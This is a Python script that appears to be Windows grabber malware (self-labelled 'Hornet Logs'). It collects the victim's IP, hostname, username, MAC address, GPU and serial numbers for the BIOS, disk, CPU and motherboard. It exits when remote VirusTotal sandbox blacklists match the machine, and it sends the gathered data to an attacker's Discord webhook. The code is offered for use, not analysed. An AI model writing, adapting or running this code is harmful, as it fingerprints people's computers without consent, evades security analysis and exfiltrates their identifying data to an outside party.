import requests
import json
import socket
import os
import re
import uuid
import wmi
import subprocess
import winreg
ip = requests.get('https://api.ipify.org').text

def getip():
    ip = "None"
    try:
        ip = requests.get("https://api.ipify.org").text
    except:
        pass
    return ip


def get_guid():
    try:
        reg_connection = winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE)
        key_value = winreg.OpenKey(reg_connection, r"SOFTWARE\Microsoft\Cryptography")
        return winreg.QueryValueEx(key_value, "MachineGuid")[0]
    except Exception as e:
        pass


def get_hwguid():
    try:
        reg_connection = winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE)
        key_value = winreg.OpenKey(reg_connection,
                                   r"SYSTEM\CurrentControlSet\Control\IDConfigDB\Hardware Profiles\0001")
        return winreg.QueryValueEx(key_value, "HwProfileGuid")[0]
    except Exception as e:
        pass

desktop_name = socket.gethostname()
pc_name = os.getenv("UserName")
ip = getip()
serveruser = os.getenv("UserName")
mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
computer = wmi.WMI()
os_info = computer.Win32_OperatingSystem()[0]
os_name = os_info.Name.encode('utf-8').split(b'|')[0]
os_name = f'{os_name}'.replace('b', ' ').replace("'", " ")
gpu = computer.Win32_VideoController()[0].Name
currentplat = os_name
hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
current_baseboard_manufacturer = subprocess.check_output('wmic baseboard get manufacturer').decode().split('\n')[1].strip()
current_diskdrive_serial = subprocess.check_output('wmic diskdrive get serialnumber').decode().split('\n')[1].strip()
current_cpu_serial = subprocess.check_output('wmic cpu get serialnumber').decode().split('\n')[1].strip()
current_bios_serial = subprocess.check_output('wmic bios get serialnumber').decode().split('\n')[1].strip()
current_baseboard_serial = subprocess.check_output('wmic baseboard get serialnumber').decode().split('\n')[1].strip()
hwidlist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/hwid_list.txt')
pcnamelist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_name_list.txt')
pcusernamelist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_username_list.txt')
iplist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/ip_list.txt')
maclist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/mac_list.txt')
gpulist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/gpu_list.txt')
platformlist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_platforms.txt')
bios_serial_list = requests.get(
    'https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/BIOS_Serial_List.txt')
baseboardmanufacturerlist = requests.get(
    'https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/BaseBoard_Manufacturer_List.txt')
baseboardserial_list = requests.get(
    'https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/BaseBoard_Serial_List.txt')
cpuserial_list = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/CPU_Serial_List.txt')
diskdriveserial_list = requests.get(
    'https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/DiskDrive_Serial_List.txt')
hwprofileguidlist = requests.get(
    'https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/HwProfileGuid_List.txt')
machineguidlist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/MachineGuid.txt')
hwguid = f'{get_hwguid()}'.replace('{', ' ').replace('}', ' ')

def listcheck():
    try:
        if hwid in hwidlist.text:
            os._exit(1)
    except:
        os._exit(1)

    try:
        if serveruser in pcusernamelist.text:
            os._exit(1)
    except:
        os._exit(1)

    try:
        if pc_name in pcnamelist.text:
            os._exit(1)
    except:
        os._exit(1)

    try:
        if ip in iplist.text:
            os._exit(1)
    except:
        os._exit(1)

    try:
        if mac in maclist.text:
            os._exit(1)
    except:
        os._exit(1)

    try:
        if gpu in gpulist.text:
            os._exit(1)
    except:
        os._exit(1)

    try:
        if current_diskdrive_serial in diskdriveserial_list:
            os._exit(1)
    except:
        os._exit(1)

    try:
        if current_cpu_serial in cpuserial_list:
            os._exit(1)
    except:
        os._exit(1)

    try:
        if current_baseboard_manufacturer in baseboardmanufacturerlist:
            os._exit(1)
    except:
        os._exit(1)

    try:
        if current_bios_serial in bios_serial_list:
            os._exit(1)
    except:
        os._exit(1)

    try:
        if current_baseboard_serial in baseboardserial_list:
            os._exit(1)
    except:
        os._exit(1)

    try:
        if get_guid() in machineguidlist:
            os._exit(1)
    except:
        os._exit(1)

    try:
        if hwguid in hwprofileguidlist:
            os._exit(1)
    except:
        os._exit(1)
listcheck()

payload = {
    "embeds": [
        {
            "title": "IP Information",
            "description": f"IP Address: {ip}",
            "color": 16763904,
            "fields": [
                {
                    "name": "Desktop Name",
                    "value": desktop_name,
                    "inline": False
                },
                {
                    "name": "PC Name",
                    "value": pc_name,
                    "inline": False
                },
                {
                    "name": "Motherboard",
                    "value": current_baseboard_manufacturer,
                    "inline": False
                },
                {
                    "name": "Diskdrive Serial",
                    "value": current_diskdrive_serial,
                    "inline": False
                },
                {
                    "name": "Gpu Serial",
                    "value": current_cpu_serial,
                    "inline": False
                },
                {
                    "name": "Bios Serial",
                    "value": current_bios_serial,
                    "inline": False
                },
                {
                    "name": "Baseboard Serial",
                    "value": current_baseboard_serial,
                    "inline": False
                },
                {
                    "name": "OS Name",
                    "value": os_name,
                    "inline": False
                },
                {
                    "name": "Mac Address",
                    "value": mac,
                    "inline": False
                },
                {
                    "name": "GPU",
                    "value": gpu,
                    "inline": False
                }
            ],
            "thumbnail": {
                "url": "https://cdn-icons-png.flaticon.com/512/4944/4944141.png"
            }
        }
    ],
    "username": "Hornet Logs",
    "avatar_url": "https://cdn-icons-png.flaticon.com/512/4944/4944141.png"
}

webhook_url = "WEBHOOK_HERE"
response = requests.post(webhook_url, json=payload)
